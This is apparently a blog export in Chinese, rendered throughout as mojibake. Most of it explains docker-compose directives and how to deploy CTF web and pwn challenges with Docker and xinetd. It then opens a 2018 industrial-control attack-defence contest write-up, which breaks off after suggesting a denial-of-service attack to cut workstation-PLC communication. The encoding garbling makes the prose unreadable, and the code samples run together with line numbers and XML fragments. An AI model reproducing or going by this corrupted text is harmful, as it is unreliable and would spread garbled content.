¼å¼ä¸º docker-compose versionã€‚ æ‰“å°ç‰ˆæœ¬ä¿¡æ¯ã€‚ Composeæ¨¡æ¿æ–‡ä»¶æ¨¡æ¿æ–‡ä»¶æ˜¯ä½¿ç”¨ Compose çš„æ ¸å¿ƒï¼Œæ¶‰åŠåˆ°çš„æŒ‡ä»¤å…³é”®å­—ä¹Ÿæ¯”è¾ƒå¤šã€‚ä½†å¤§å®¶ä¸ç”¨æ‹…å¿ƒï¼Œè¿™é‡Œé¢å¤§éƒ¨åˆ†æŒ‡ä»¤è·Ÿ docker run ç›¸å…³å‚æ•°çš„å«ä¹‰éƒ½æ˜¯ç±»ä¼¼çš„ã€‚ é»˜è®¤çš„æ¨¡æ¿æ–‡ä»¶åç§°ä¸º docker-compose.ymlï¼Œæ ¼å¼ä¸º YAML æ ¼å¼ã€‚ 123456789version: "3"services: webapp: image: examples/web ports: - "80:80" volumes: - "/data" æ³¨æ„æ¯ä¸ªæœåŠ¡éƒ½å¿…é¡»é€šè¿‡ image æŒ‡ä»¤æŒ‡å®šé•œåƒæˆ– build æŒ‡ä»¤ï¼ˆéœ€è¦ Dockerfileï¼‰ç­‰æ¥è‡ªåŠ¨æž„å»ºç”Ÿæˆé•œåƒã€‚ å¦‚æžœä½¿ç”¨ build æŒ‡ä»¤ï¼Œåœ¨ Dockerfile ä¸­è®¾ç½®çš„é€‰é¡¹(ä¾‹å¦‚ï¼šCMD, EXPOSE, VOLUME, ENV ç­‰) å°†ä¼šè‡ªåŠ¨è¢«èŽ·å–ï¼Œæ— éœ€åœ¨ docker-compose.yml ä¸­å†æ¬¡è®¾ç½®ã€‚ ä¸‹é¢åˆ†åˆ«ä»‹ç»å„ä¸ªæŒ‡ä»¤çš„ç”¨æ³•ã€‚ build æŒ‡å®š Dockerfile æ‰€åœ¨æ–‡ä»¶å¤¹çš„è·¯å¾„ï¼ˆå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„ï¼Œæˆ–è€…ç›¸å¯¹ docker-compose.yml æ–‡ä»¶çš„è·¯å¾„ï¼‰ã€‚ Compose å°†ä¼šåˆ©ç”¨å®ƒè‡ªåŠ¨æž„å»ºè¿™ä¸ªé•œåƒï¼Œç„¶åŽä½¿ç”¨è¿™ä¸ªé•œåƒã€‚ 12345version: '3'services: webapp: build: ./dir ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ context æŒ‡ä»¤æŒ‡å®š Dockerfile æ‰€åœ¨æ–‡ä»¶å¤¹çš„è·¯å¾„ã€‚ ä½¿ç”¨ dockerfile æŒ‡ä»¤æŒ‡å®š Dockerfile æ–‡ä»¶åã€‚ ä½¿ç”¨ arg æŒ‡ä»¤æŒ‡å®šæž„å»ºé•œåƒæ—¶çš„å˜é‡ã€‚ 123456789version: '3'services: webapp: build: context: ./dir dockerfile: Dockerfile-alternate args: buildno: 1 ä½¿ç”¨ cache_from æŒ‡å®šæž„å»ºé•œåƒçš„ç¼“å­˜ 12345build: context: . cache_from: - alpine:latest - corp/web_app:3.14 cap_add, cap_drop æŒ‡å®šå®¹å™¨çš„å†…æ ¸èƒ½åŠ›ï¼ˆcapacityï¼‰åˆ†é…ã€‚ ä¾‹å¦‚ï¼Œè®©å®¹å™¨æ‹¥æœ‰æ‰€æœ‰èƒ½åŠ›å¯ä»¥æŒ‡å®šä¸ºï¼š 12cap_add: - ALL åŽ»æŽ‰ NET_ADMIN èƒ½åŠ›å¯ä»¥æŒ‡å®šä¸ºï¼š 12cap_drop: - NET_ADMIN command è¦†ç›–å®¹å™¨å¯åŠ¨åŽé»˜è®¤æ‰§è¡Œçš„å‘½ä»¤ã€‚ 1command: echo "hello world" configs ä»…ç”¨äºŽ Swarm modeï¼Œè¯¦ç»†å†…å®¹è¯·æŸ¥çœ‹ Swarm mode ä¸€èŠ‚ã€‚ cgroup_parent æŒ‡å®šçˆ¶ cgroup ç»„ï¼Œæ„å‘³ç€å°†ç»§æ‰¿è¯¥ç»„çš„èµ„æºé™åˆ¶ã€‚ ä¾‹å¦‚ï¼Œåˆ›å»ºäº†ä¸€ä¸ª cgroup ç»„åç§°ä¸º cgroups_1ã€‚ 1cgroup_parent: cgroups_1 container_name æŒ‡å®šå®¹å™¨åç§°ã€‚é»˜è®¤å°†ä¼šä½¿ç”¨ é¡¹ç›®åç§°_æœåŠ¡åç§°_åºå· è¿™æ ·çš„æ ¼å¼ã€‚ 1container_name: docker-web-container æ³¨æ„: æŒ‡å®šå®¹å™¨åç§°åŽï¼Œè¯¥æœåŠ¡å°†æ— æ³•è¿›è¡Œæ‰©å±•ï¼ˆscaleï¼‰ï¼Œå› ä¸º Docker ä¸å…è®¸å¤šä¸ªå®¹å™¨å…·æœ‰ç›¸åŒçš„åç§°ã€‚ deploy ä»…ç”¨äºŽ Swarm modeï¼Œè¯¦ç»†å†…å®¹è¯·æŸ¥çœ‹ Swarm mode ä¸€èŠ‚ devices æŒ‡å®šè®¾å¤‡æ˜ å°„å…³ç³»ã€‚ 12devices: - "/dev/ttyUSB1:/dev/ttyUSB0" depends_on è§£å†³å®¹å™¨çš„ä¾èµ–ã€å¯åŠ¨å…ˆåŽçš„é—®é¢˜ã€‚ä»¥ä¸‹ä¾‹å­ä¸­ä¼šå…ˆå¯åŠ¨ redis db å†å¯åŠ¨ web 1234567891011121314version: '3'services: web: build: . depends_on: - db - redis redis: image: redis db: image: postgres æ³¨æ„ï¼šweb æœåŠ¡ä¸ä¼šç­‰å¾… redis db ã€Œå®Œå…¨å¯åŠ¨ã€ä¹‹åŽæ‰å¯åŠ¨ã€‚ dns è‡ªå®šä¹‰ DNS æœåŠ¡å™¨ã€‚å¯ä»¥æ˜¯ä¸€ä¸ªå€¼ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåˆ—è¡¨ã€‚ 12345dns: 8.8.8.8dns: - 8.8.8.8 - 114.114.114.114 dns_search é…ç½® DNS æœç´¢åŸŸã€‚å¯ä»¥æ˜¯ä¸€ä¸ªå€¼ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåˆ—è¡¨ã€‚ 12345dns_search: example.comdns_search: - domain1.example.com - domain2.example.com tmpfs æŒ‚è½½ä¸€ä¸ª tmpfs æ–‡ä»¶ç³»ç»Ÿåˆ°å®¹å™¨ã€‚ 1234tmpfs: /runtmpfs: - /run - /tmp env_file ä»Žæ–‡ä»¶ä¸­èŽ·å–çŽ¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä¸ºå•ç‹¬çš„æ–‡ä»¶è·¯å¾„æˆ–åˆ—è¡¨ã€‚ å¦‚æžœé€šè¿‡ docker-compose -f FILE æ–¹å¼æ¥æŒ‡å®š Compose æ¨¡æ¿æ–‡ä»¶ï¼Œåˆ™ env_file ä¸­å˜é‡çš„è·¯å¾„ä¼šåŸºäºŽæ¨¡æ¿æ–‡ä»¶è·¯å¾„ã€‚ å¦‚æžœæœ‰å˜é‡åç§°ä¸Ž environment æŒ‡ä»¤å†²çªï¼Œåˆ™æŒ‰ç…§æƒ¯ä¾‹ï¼Œä»¥åŽè€…ä¸ºå‡†ã€‚ 123456env_file: .envenv_file: - ./common.env - ./apps/web.env - /opt/secrets.env çŽ¯å¢ƒå˜é‡æ–‡ä»¶ä¸­æ¯ä¸€è¡Œå¿…é¡»ç¬¦åˆæ ¼å¼ï¼Œæ”¯æŒ # å¼€å¤´çš„æ³¨é‡Šè¡Œã€‚ 12# common.env: Set development environmentPROG_ENV=development environment è®¾ç½®çŽ¯å¢ƒå˜é‡ã€‚ä½ å¯ä»¥ä½¿ç”¨æ•°ç»„æˆ–å­—å…¸ä¸¤ç§æ ¼å¼ã€‚ åªç»™å®šåç§°çš„å˜é‡ä¼šè‡ªåŠ¨èŽ·å–è¿è¡Œ Compose ä¸»æœºä¸Šå¯¹åº”å˜é‡çš„å€¼ï¼Œå¯ä»¥ç”¨æ¥é˜²æ­¢æ³„éœ²ä¸å¿…è¦çš„æ•°æ®ã€‚ 1234567environment: RACK_ENV: development SESSION_SECRET:environment: - RACK_ENV=development - SESSION_SECRET å¦‚æžœå˜é‡åç§°æˆ–è€…å€¼ä¸­ç”¨åˆ° true|falseï¼Œyes|no ç­‰è¡¨è¾¾ å¸ƒå°” å«ä¹‰çš„è¯æ±‡ï¼Œæœ€å¥½æ”¾åˆ°å¼•å·é‡Œï¼Œé¿å… YAML è‡ªåŠ¨è§£æžæŸäº›å†…å®¹ä¸ºå¯¹åº”çš„å¸ƒå°”è¯­ä¹‰ã€‚è¿™äº›ç‰¹å®šè¯æ±‡ï¼ŒåŒ…æ‹¬ 1y|Y|yes|Yes|YES|n|N|no|No|NO|true|True|TRUE|false|False|FALSE|on|On|ON|off|Off|OFF expose æš´éœ²ç«¯å£ï¼Œä½†ä¸æ˜ å°„åˆ°å®¿ä¸»æœºï¼Œåªè¢«è¿žæŽ¥çš„æœåŠ¡è®¿é—®ã€‚ ä»…å¯ä»¥æŒ‡å®šå†…éƒ¨ç«¯å£ä¸ºå‚æ•° 123expose: - "3000" - "8000" external_links æ³¨æ„ï¼šä¸å»ºè®®ä½¿ç”¨è¯¥æŒ‡ä»¤ã€‚ é“¾æŽ¥åˆ° docker-compose.yml å¤–éƒ¨çš„å®¹å™¨ï¼Œç”šè‡³å¹¶éž Compose ç®¡ç†çš„å¤–éƒ¨å®¹å™¨ã€‚ 1234external_links: - redis_1 - project_db_1:mysql - project_db_1:postgresql extra_hosts ç±»ä¼¼ Docker ä¸­çš„ --add-host å‚æ•°ï¼ŒæŒ‡å®šé¢å¤–çš„ host åç§°æ˜ å°„ä¿¡æ¯ã€‚ 123extra_hosts: - "googledns:8.8.8.8" - "dockerhub:52.1.157.61" ä¼šåœ¨å¯åŠ¨åŽçš„æœåŠ¡å®¹å™¨ä¸­ /etc/hosts æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä¸¤æ¡æ¡ç›®ã€‚ 128.8.8.8 googledns52.1.157.61 dockerhub healthcheck é€šè¿‡å‘½ä»¤æ£€æŸ¥å®¹å™¨æ˜¯å¦å¥åº·è¿è¡Œã€‚ 12345healthcheck: test: ["CMD", "curl", "-f", "http://localhost"] interval: 1m30s timeout: 10s retries: 3 image æŒ‡å®šä¸ºé•œåƒåç§°æˆ–é•œåƒ IDã€‚å¦‚æžœé•œåƒåœ¨æœ¬åœ°ä¸å­˜åœ¨ï¼ŒCompose å°†ä¼šå°è¯•æ‹‰å–è¿™ä¸ªé•œåƒã€‚ 123image: ubuntuimage: orchardup/postgresqlimage: a4bc65fd labels ä¸ºå®¹å™¨æ·»åŠ  Docker å…ƒæ•°æ®ï¼ˆmetadataï¼‰ä¿¡æ¯ã€‚ä¾‹å¦‚å¯ä»¥ä¸ºå®¹å™¨æ·»åŠ è¾…åŠ©è¯´æ˜Žä¿¡æ¯ã€‚ 1234labels: com.startupteam.description: "webapp for a startup team" com.startupteam.department: "devops department" com.startupteam.release: "rc3 for v1.0" links æ³¨æ„ï¼šä¸æŽ¨èä½¿ç”¨è¯¥æŒ‡ä»¤ã€‚ logging é…ç½®æ—¥å¿—é€‰é¡¹ã€‚ 1234logging: driver: syslog options: syslog-address: "tcp://192.168.0.42:123" ç›®å‰æ”¯æŒä¸‰ç§æ—¥å¿—é©±åŠ¨ç±»åž‹ã€‚ 123driver: "json-file"driver: "syslog"driver: "none" options é…ç½®æ—¥å¿—é©±åŠ¨çš„ç›¸å…³å‚æ•°ã€‚ 123options: max-size: "200k" max-file: "10" network_mode è®¾ç½®ç½‘ç»œæ¨¡å¼ã€‚ä½¿ç”¨å’Œ docker run çš„ --network å‚æ•°ä¸€æ ·çš„å€¼ã€‚ 12345network_mode: "bridge"network_mode: "host"network_mode: "none"network_mode: "service:[service name]"network_mode: "container:[container name/id]" networks é…ç½®å®¹å™¨è¿žæŽ¥çš„ç½‘ç»œã€‚ 1234567891011version: "3"services: some-service: networks: - some-network - other-networknetworks: some-network: other-network: pid è·Ÿä¸»æœºç³»ç»Ÿå…±äº«è¿›ç¨‹å‘½åç©ºé—´ã€‚æ‰“å¼€è¯¥é€‰é¡¹çš„å®¹å™¨ä¹‹é—´ï¼Œä»¥åŠå®¹å™¨å’Œå®¿ä¸»æœºç³»ç»Ÿä¹‹é—´å¯ä»¥é€šè¿‡è¿›ç¨‹ ID æ¥ç›¸äº’è®¿é—®å’Œæ“ä½œã€‚ 1pid: "host" ports æš´éœ²ç«¯å£ä¿¡æ¯ã€‚ ä½¿ç”¨å®¿ä¸»ç«¯å£ï¼šå®¹å™¨ç«¯å£ (HOST:CONTAINER) æ ¼å¼ï¼Œæˆ–è€…ä»…ä»…æŒ‡å®šå®¹å™¨çš„ç«¯å£ï¼ˆå®¿ä¸»å°†ä¼šéšæœºé€‰æ‹©ç«¯å£ï¼‰éƒ½å¯ä»¥ã€‚ 12345ports: - "3000" - "8000:8000" - "49100:22" - "127.0.0.1:8001:8001" æ³¨æ„ï¼šå½“ä½¿ç”¨ HOST:CONTAINER æ ¼å¼æ¥æ˜ å°„ç«¯å£æ—¶ï¼Œå¦‚æžœä½ ä½¿ç”¨çš„å®¹å™¨ç«¯å£å°äºŽ 60 å¹¶ä¸”æ²¡æ”¾åˆ°å¼•å·é‡Œï¼Œå¯èƒ½ä¼šå¾—åˆ°é”™è¯¯ç»“æžœï¼Œå› ä¸º YAML ä¼šè‡ªåŠ¨è§£æž xx:yy è¿™ç§æ•°å­—æ ¼å¼ä¸º 60 è¿›åˆ¶ã€‚ä¸ºé¿å…å‡ºçŽ°è¿™ç§é—®é¢˜ï¼Œå»ºè®®æ•°å­—ä¸²éƒ½é‡‡ç”¨å¼•å·åŒ…æ‹¬èµ·æ¥çš„å­—ç¬¦ä¸²æ ¼å¼ã€‚ secrets å­˜å‚¨æ•æ„Ÿæ•°æ®ï¼Œä¾‹å¦‚ mysql æœåŠ¡å¯†ç ã€‚ 12345678910111213141516version: "3.1"services:mysql: image: mysql environment: MYSQL_ROOT_PASSWORD_FILE: /run/secrets/db_root_password secrets: - db_root_password - my_other_secretsecrets: my_secret: file: ./my_secret.txt my_other_secret: external: true security_opt æŒ‡å®šå®¹å™¨æ¨¡æ¿æ ‡ç­¾ï¼ˆlabelï¼‰æœºåˆ¶çš„é»˜è®¤å±žæ€§ï¼ˆç”¨æˆ·ã€è§’è‰²ã€ç±»åž‹ã€çº§åˆ«ç­‰ï¼‰ã€‚ä¾‹å¦‚é…ç½®æ ‡ç­¾çš„ç”¨æˆ·åå’Œè§’è‰²åã€‚ 123security_opt: - label:user:USER - label:role:ROLE stop_signal è®¾ç½®å¦ä¸€ä¸ªä¿¡å·æ¥åœæ­¢å®¹å™¨ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨çš„æ˜¯ SIGTERM åœæ­¢å®¹å™¨ã€‚ 1stop_signal: SIGUSR1 sysctls é…ç½®å®¹å™¨å†…æ ¸å‚æ•°ã€‚ 1234567sysctls: net.core.somaxconn: 1024 net.ipv4.tcp_syncookies: 0sysctls: - net.core.somaxconn=1024 - net.ipv4.tcp_syncookies=0 ulimits æŒ‡å®šå®¹å™¨çš„ ulimits é™åˆ¶å€¼ã€‚ ä¾‹å¦‚ï¼ŒæŒ‡å®šæœ€å¤§è¿›ç¨‹æ•°ä¸º 65535ï¼ŒæŒ‡å®šæ–‡ä»¶å¥æŸ„æ•°ä¸º 20000ï¼ˆè½¯é™åˆ¶ï¼Œåº”ç”¨å¯ä»¥éšæ—¶ä¿®æ”¹ï¼Œä¸èƒ½è¶…è¿‡ç¡¬é™åˆ¶ï¼‰ å’Œ 40000ï¼ˆç³»ç»Ÿç¡¬é™åˆ¶ï¼Œåªèƒ½ root ç”¨æˆ·æé«˜ï¼‰ã€‚ 12345ulimits: nproc: 65535 nofile: soft: 20000 hard: 40000 volumes æ•°æ®å·æ‰€æŒ‚è½½è·¯å¾„è®¾ç½®ã€‚å¯ä»¥è®¾ç½®å®¿ä¸»æœºè·¯å¾„ ï¼ˆHOST:CONTAINERï¼‰ æˆ–åŠ ä¸Šè®¿é—®æ¨¡å¼ ï¼ˆHOST:CONTAINER:roï¼‰ã€‚ è¯¥æŒ‡ä»¤ä¸­è·¯å¾„æ”¯æŒç›¸å¯¹è·¯å¾„ã€‚ 1234volumes: - /var/lib/mysql - cache/:/tmp/cache - ~/configs:/etc/configs/:ro å…¶å®ƒæŒ‡ä»¤ æ­¤å¤–ï¼Œè¿˜æœ‰åŒ…æ‹¬ domainname, entrypoint, hostname, ipc, mac_address, privileged, read_only, shm_size, restart, stdin_open, tty, user, working_dir ç­‰æŒ‡ä»¤ï¼ŒåŸºæœ¬è·Ÿ docker run ä¸­å¯¹åº”å‚æ•°çš„åŠŸèƒ½ä¸€è‡´ã€‚ æŒ‡å®šæœåŠ¡å®¹å™¨å¯åŠ¨åŽæ‰§è¡Œçš„å…¥å£æ–‡ä»¶ã€‚ 1entrypoint: /code/entrypoint.sh æŒ‡å®šå®¹å™¨ä¸­è¿è¡Œåº”ç”¨çš„ç”¨æˆ·åã€‚ 1user: nginx æŒ‡å®šå®¹å™¨ä¸­å·¥ä½œç›®å½•ã€‚ 1working_dir: /code æŒ‡å®šå®¹å™¨ä¸­æœç´¢åŸŸåã€ä¸»æœºåã€mac åœ°å€ç­‰ã€‚ 123domainname: your_website.comhostname: testmac_address: 08-00-27-00-0C-0A å…è®¸å®¹å™¨ä¸­è¿è¡Œä¸€äº›ç‰¹æƒå‘½ä»¤ã€‚ 1privileged: true æŒ‡å®šå®¹å™¨é€€å‡ºåŽçš„é‡å¯ç­–ç•¥ä¸ºå§‹ç»ˆé‡å¯ã€‚è¯¥å‘½ä»¤å¯¹ä¿æŒæœåŠ¡å§‹ç»ˆè¿è¡Œååˆ†æœ‰æ•ˆï¼Œåœ¨ç”Ÿäº§çŽ¯å¢ƒä¸­æŽ¨èé…ç½®ä¸º always æˆ–è€… unless-stoppedã€‚ 1restart: always ä»¥åªè¯»æ¨¡å¼æŒ‚è½½å®¹å™¨çš„ root æ–‡ä»¶ç³»ç»Ÿï¼Œæ„å‘³ç€ä¸èƒ½å¯¹å®¹å™¨å†…å®¹è¿›è¡Œä¿®æ”¹ã€‚ 1read_only: true æ‰“å¼€æ ‡å‡†è¾“å…¥ï¼Œå¯ä»¥æŽ¥å—å¤–éƒ¨è¾“å…¥ã€‚ 1stdin_open: true æ¨¡æ‹Ÿä¸€ä¸ªä¼ªç»ˆç«¯ã€‚ 1tty: true è¯»å–å˜é‡ Compose æ¨¡æ¿æ–‡ä»¶æ”¯æŒåŠ¨æ€è¯»å–ä¸»æœºçš„ç³»ç»ŸçŽ¯å¢ƒå˜é‡å’Œå½“å‰ç›®å½•ä¸‹çš„ .env æ–‡ä»¶ä¸­çš„å˜é‡ã€‚ ä¾‹å¦‚ï¼Œä¸‹é¢çš„ Compose æ–‡ä»¶å°†ä»Žè¿è¡Œå®ƒçš„çŽ¯å¢ƒä¸­è¯»å–å˜é‡ ${MONGO_VERSION} çš„å€¼ï¼Œå¹¶å†™å…¥æ‰§è¡Œçš„æŒ‡ä»¤ä¸­ã€‚ 12345version: "3"services:db: image: "mongo:$&#123;MONGO_VERSION&#125;" å¦‚æžœæ‰§è¡Œ MONGO_VERSION=3.2 docker-compose up åˆ™ä¼šå¯åŠ¨ä¸€ä¸ª mongo:3.2 é•œåƒçš„å®¹å™¨ï¼›å¦‚æžœæ‰§è¡Œ MONGO_VERSION=2.8 docker-compose up åˆ™ä¼šå¯åŠ¨ä¸€ä¸ª mongo:2.8 é•œåƒçš„å®¹å™¨ã€‚ è‹¥å½“å‰ç›®å½•å­˜åœ¨ .env æ–‡ä»¶ï¼Œæ‰§è¡Œ docker-compose å‘½ä»¤æ—¶å°†ä»Žè¯¥æ–‡ä»¶ä¸­è¯»å–å˜é‡ã€‚ åœ¨å½“å‰ç›®å½•æ–°å»º .env æ–‡ä»¶å¹¶å†™å…¥ä»¥ä¸‹å†…å®¹ã€‚ 12# æ”¯æŒ # å·æ³¨é‡ŠMONGO_VERSION=3.6 æ‰§è¡Œ docker-compose up åˆ™ä¼šå¯åŠ¨ä¸€ä¸ª mongo:3.6 é•œåƒçš„å®¹å™¨ã€‚ Docker for CTF Apply CTF-web1ã€æŸ¥æ‰¾å¯ç”¨é•œåƒï¼šdocker search lamp(è¿™æ˜¯linux+apache+mysql+phpçš„é›†æˆçŽ¯å¢ƒï¼Œéƒ¨ç½²webé¢˜å¯ç”¨) 2ã€æ‹‰å–é•œåƒï¼šdocker pull tutum/lamp ï¼ˆå…·ä½“é•œåƒçœ‹éœ€æ±‚ï¼Œè¿™é‡Œæ˜¯Out-of-the-box LAMP image (PHP+MySQL) ï¼‰ 3ã€è¿è¡Œé•œåƒå¹¶ç»‘å®šç«¯å£ï¼šdocker run -d -p 1000:80 tutum/lamp 1000æŒ‡çš„æ˜¯éœ€è¦å…¬ç½‘è®¿é—®çš„ç«¯å£ï¼ŒåŽé¢è·Ÿé•œåƒåç§°ï¼Œå¦‚æžœæ˜¯è¦ä¸åŒç«¯å£æ­å»ºä¸åŒwebé¢˜ç›®å¯é‡å¤ä½¿ç”¨æ­¤å‘½ä»¤ï¼Œæ”¹ç«¯å£å°±è¡Œã€‚ 4ã€æœ€å¥½å…ˆæŠŠé¢˜ç›®ä¸‹è½½åˆ°æœåŠ¡å™¨æœ¬åœ°ï¼Œç„¶åŽæŠŠé¢˜ç›®æ‹·è´åˆ°dockerå®¹å™¨ï¼šdocker cp é¢˜ç›®åç§° å®¹å™¨ID:/var/www/html ä¸€èˆ¬webè·¯å¾„æ˜¯/var/www/htmlï¼Œå®¹å™¨é‡Œé¢å¾ˆå¤šå‘½ä»¤éƒ½æ²¡æœ‰ï¼Œå¦‚wgetï¼Œunzipç­‰éƒ½æ²¡æœ‰ï¼Œå»ºè®®åœ¨æœ¬åœ°å°±å¼„å¥½ å¦‚æžœéœ€è¦æ•°æ®åº“ 1ã€è¿›å…¥è¦ç”¨åˆ°æ•°æ®åº“çš„å®¹å™¨å†…éƒ¨ï¼šdocker exec -it å®¹å™¨ID /bin/bash2ã€è¿›å…¥ä¹‹åŽè¿žæŽ¥æ•°æ®åº“ï¼šmysql -u root (é»˜è®¤æ²¡æœ‰å¯†ç )3ã€å¯ä»¥å…ˆçœ‹çœ‹æœ‰ä»€ä¹ˆæ•°æ®åº“ï¼šSHOW DATABASE;4ã€åˆ›å»ºæ•°æ®åº“ï¼šcreate DATABASE æ•°æ®åº“å;5ã€ä½¿ç”¨æ•°æ®åº“ï¼šuse æ•°æ®åº“åï¼›6ã€ç»™æ•°æ®åº“åˆ›å»ºç”¨æˆ·ï¼šcreate user ç”¨æˆ·å@localhost identified by â€˜å¯†ç â€™ï¼›7ã€æŽˆæƒç”¨æˆ·ï¼šgrant all privileges on æ•°æ®åº“å.* to ç”¨æˆ·å@localhost;8ã€åˆ·æ–°ï¼šflush privileges;9ã€å¦‚å†™å¥½äº†.sqlçš„æ•°æ®åº“ï¼Œå¯å¯¼å…¥æ•°æ®ï¼šsource æ–‡ä»¶çš„è·¯å¾„ ï¼ˆè¿™ä¸ªè·¯å¾„æ˜¯å®¹å™¨è·¯å¾„ï¼Œä¸€å¼€å§‹è¦æŠŠæœåŠ¡å™¨æœ¬åœ°çš„æ–‡ä»¶æ‹·è´åˆ°å®¹å™¨é‡Œï¼‰ è¿ç»´å‘½ä»¤ 1ã€æŸ¥çœ‹æœ‰ä»€ä¹ˆå®¹å™¨å’Œè¿è¡Œæƒ…å†µï¼šdocker ps -a2ã€è¿›å…¥å®¹å™¨ï¼šdocker exec -it å®¹å™¨ID /bin/bash3ã€å¯åŠ¨å®¹å™¨ï¼šdocker start å®¹å™¨ID1 å®¹å™¨ID2 ï¼ˆè¿™ä¸ªå¯ä»¥å¯åŠ¨å¤šä¸ªå®¹å™¨ï¼‰åœæ­¢å®¹å™¨å°±æŠŠstartæ”¹ä¸ºstopå³å¯4ã€å¦‚æžœæœåŠ¡å™¨é‡å¯äº†ä¹‹åŽdockeræ²¡å¯åŠ¨ï¼Œå¯ä»¥æ·»åŠ å‚æ•°ä¿è¯æ¯æ¬¡é‡å¯ä¹‹åŽå®¹å™¨ä¹Ÿé‡å¯ï¼šdocker update â€“restart=always å¤šä¸ªå®¹å™¨ID å‡ºé¢˜æœ€å¥½å†™dockerfile æ–¹ä¾¿æ¯”èµ›é€‰æ‰‹å¤çŽ°XD CTF-PwnçŽ°åœ¨ä¸€èˆ¬ CTF Pwnçš„çŽ¯å¢ƒéƒ½æ˜¯ç”± xinted + docker ç»„æˆã€‚åœ¨githubä¸Š xinetd çš„é¡¹ç›®ä»Žæƒé™åˆ°æœåŠ¡é…ç½®éƒ½åšå¥½äº†ä¸€ä¸ªdockerfile æˆ‘ä»¬åªéœ€è¦buildä¸€ä¸‹å°±å¥½äº†..å…·ä½“æ­¥éª¤å¦‚ä¸‹ å®‰è£… dockeråœ¨ ubuntuçŽ¯å¢ƒä¸‹ï¼Œéœ€è¦ä»¥root å®‰è£… dockersudo apt-get install docker-ceclone ctf_xinetdé¡¹ç›®git clone https://github.com/Eadom/ctf_xinetd.git é…ç½® dockerçŽ¯å¢ƒ1ã€ å°†ä½ çš„bin æ–‡ä»¶æ”¾ç½®åˆ° bin ç›®å½•ä¸‹2ã€ ä¿®æ”¹ flag æ–‡æœ¬å†…å®¹ ä¸ºä½ æŒ‡å®šçš„ flag3ã€ç´§æŽ¥ç€ä¿®æ”¹ ctf.xinetd çš„æœåŠ¡ï¼športä¸ºæŒ‡å®šç«¯å£ 1server_args = --userspec=1000:1000 /home/ctf ./helloworld ä¿®æ”¹â€helloworldâ€ä¸ºä½ çš„binæ–‡ä»¶åç§° build dockerfileåœ¨gitä¸‹çš„ç›®å½•ä¸‹docker build -t &quot;helloworld&quot; . (æ³¨æ„åŽé¢æ˜¯æœ‰ä¸ªç‚¹çš„ï¼‰ï¼Œhellowordæ˜¯ä½ ç¼–è¯‘åŽimageçš„åç§°ï¼Œä¸è¦ä½¿ç”¨binä½œä¸ºæŒ‘æˆ˜çš„åç§° åˆ›å»ºå®¹å™¨docker çš„å®¹å™¨ç›¸å½“äºŽæ˜¯è¿è¡Œäº†ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œåˆ›å»ºå®¹å™¨åŽï¼Œå°±æ˜¯å°†é•œåƒè·‘èµ·æ¥äº†ã€‚ 12docker run -d -p "0.0.0.0:pub_port:9999" -h "helloworld" --name="helloworld" helloworld//-h ä¸»æœºå ï¼› --name å®¹å™¨å pub_port æ˜¯æ‚¨è¦å‘å…¬å…±ç½‘ç»œå…¬å¼€çš„ç«¯å£ å¦‚æžœæ‚¨æƒ³æ•èŽ·æŒ‘æˆ˜æµé‡ï¼Œåªéœ€tcpdumpåœ¨ä¸»æœºä¸Šè¿è¡Œå³å¯ã€‚è¿™æ˜¯ä¸€ä¸ªä¾‹å­ã€‚ 1tcpdump -w helloworld.pcap -i eth0 port pub_port å¦å¤–æ­£å¸¸æƒ…å†µä¸‹ dockeræ˜¯éœ€è¦sudoæƒé™æ‰èƒ½è·‘çš„ã€‚æ‰€ä»¥å¦‚æžœåœ¨éžrootä¸‹åˆ›å»ºçŽ¯å¢ƒï¼Œè®°å¾—ç”¨sudo è¿è¡Œdocker æœ€åŽ å¤çŽ°é¢˜ç›®éƒ½å¾ˆç®€å•,ä¾¿æ·å¼çš„éƒ¨ç½²æ¡†æž¶ä¹Ÿå¾ˆå¤šï¼Œä¸‹é¢ä¼šè´´å‡ ä¸ªæˆ‘çš„fock. å‡ºé¢˜å’Œéƒ¨ç½²æ‰éœ€è¦å¤šå®žè·µæ‰èƒ½ç†Ÿç»ƒæŽŒæ¡dockeråœ¨CTFçš„å¦™ç”¨(23333) https://github.com/Qymua/pwn_deploy_chroot https://github.com/Qymua/ctf_xinetd https://github.com/Qymua/pwn-env-init]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker-compose</tag>
        <tag>Pwn</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018FJå·¥æŽ§æ”»é˜²å¤§èµ›WriteUp]]></title>
    <url>%2F2019%2F08%2F15%2F2018FJ%E5%B7%A5%E6%8E%A7%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9BWriteUp%2F</url>
    <content type="text"><![CDATA[è¿™æ˜¯ä¸€æ¬¡çœå†…é¦–æ¬¡ä¸¾åŠžçš„å·¥æŽ§æ”»é˜²å¤§èµ›ï¼Œèµ›åˆ¶æœ‰åˆ«äºŽå›½å†…å¾€å±Šå·¥ä¸šä¿¡æ¯å®‰å…¨æŠ€èƒ½ç«žèµ›ï¼Œæœ¬è´¨å…¶å®žå°±æ˜¯å†…ç½‘æ¸—é€ï¼Œæ”»å‡»ç›®æ ‡é¶æœºå–å¾—æŽ§åˆ¶æƒå¹¶ç¯¡æ”¹å…¶ç¨‹åº åˆèµ› ç¬¬ä¸€å±‚:é€šè¿‡æ”»å‡»ï¼Œå¯¼è‡´å·¥ä½œç«™ä¸Žé¶æœºç³»ç»Ÿé€šä¿¡ä¸­æ–­ æ”»å‡»æ€è·¯: é€šä¿¡ä¸­æ–­ï¼Œå¤§å±æ˜¾ç¤ºå™¨ç»„æ€ç•Œé¢å³ä¸Šè§’ä¼šçº¢å­—é—ªçƒæç¤ºé€šä¿¡å¼‚å¸¸ã€‚æ•´æ¡é€šä¿¡é“¾è·¯ä¸Šæœ‰å·¥ä½œç«™ã€äº¤æ¢æœºã€PLCï¼Œå¯ä»¥ä¼˜å…ˆå°è¯•ä½¿ç”¨æ‹’ç»æœåŠ¡æ”»å‡»æ‰‹æ®µã€‚ 